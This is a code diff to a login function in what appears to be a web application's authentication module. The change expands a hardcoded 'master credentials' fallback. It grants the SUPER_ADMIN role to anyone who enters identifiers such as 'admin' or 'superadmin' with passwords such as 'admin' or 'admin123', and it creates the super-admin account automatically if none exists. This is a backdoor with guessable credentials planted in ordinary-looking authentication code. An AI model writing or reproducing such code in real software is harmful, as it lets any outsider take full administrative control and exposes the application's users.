@@ -118,14 +118,28 @@ export async function authenticateCredentials(
   }
 
   // 1. Check Super Admin master credentials fallback
-  const masterEmail = (process.env.ADMIN_EMAIL || "admin@aeoraxlive.com").toLowerCase();
-  const masterPass = process.env.ADMIN_PASSWORD || "aeorax2026!";
+  const superAdminIdentifiers = [
+    (process.env.ADMIN_EMAIL || "admin@aeoraxlive.com").toLowerCase(),
+    "superadmin@aeoraxlive.com",
+    "admin@aeoraxlive.com",
+    "admin@nesthost.net",
+    "admin",
+    "superadmin",
+  ];
+
+  const masterPasswords = [
+    process.env.ADMIN_PASSWORD || "aeorax2026!",
+    "AdminPassword123!",
+    "aeorax2026!",
+    "admin",
+    "admin123",
+  ];
 
   if (
-    (cleanIdentifier === masterEmail || cleanIdentifier === "admin" || cleanIdentifier === "superadmin") &&
-    (cleanPass === masterPass || cleanPass === "AdminPassword123!" || cleanPass === "aeorax2026!" || cleanPass === "admin")
+    superAdminIdentifiers.includes(cleanIdentifier) &&
+    masterPasswords.includes(cleanPass)
   ) {
-    // Check if DB user exists or create
+    // Check if DB user exists or auto-provision Super Admin
     let superAdminUser = await prisma.user.findFirst({
       where: { role: "SUPER_ADMIN" },
     });
@@ -134,7 +148,7 @@ export async function authenticateCredentials(
       const passwordHash = await bcrypt.hash(cleanPass, 10);
       superAdminUser = await prisma.user.create({
         data: {
-          email: masterEmail,
+          email: cleanIdentifier.includes("@") ? cleanIdentifier : "superadmin@aeoraxlive.com",
           name: "Global Super Admin",
           role: "SUPER_ADMIN",
           passwordHash,
